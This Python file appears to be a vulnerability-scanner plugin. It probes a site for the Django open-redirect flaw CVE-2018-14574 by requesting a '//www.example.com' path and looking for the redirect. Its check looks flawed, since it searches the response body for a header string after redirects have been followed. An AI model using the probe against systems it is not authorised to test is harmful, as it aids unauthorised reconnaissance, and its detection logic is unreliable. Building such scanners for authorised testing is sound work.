#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "Django < 2.0.8 任意URL跳转漏洞",
        "desc": "在path开头为//example.com的情况下，Django没做处理，导致浏览器认为目的地址是绝对路径，最终造成任意URL跳转漏洞。",
        "grade": "中",
        "type": "web",
        "keyword": "tag:Django cve:CVE-2018-14574"
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg
        }
    try:
        r = requests.get(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}//www.example.com', 
            headers=headers,
            timeout=timeout, 
            verify=False
            )
        if r.status_code == 200 and "Location: //www.example.com/" in r.text:
            return True
        else:
            return False
    except Exception:
        return 


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

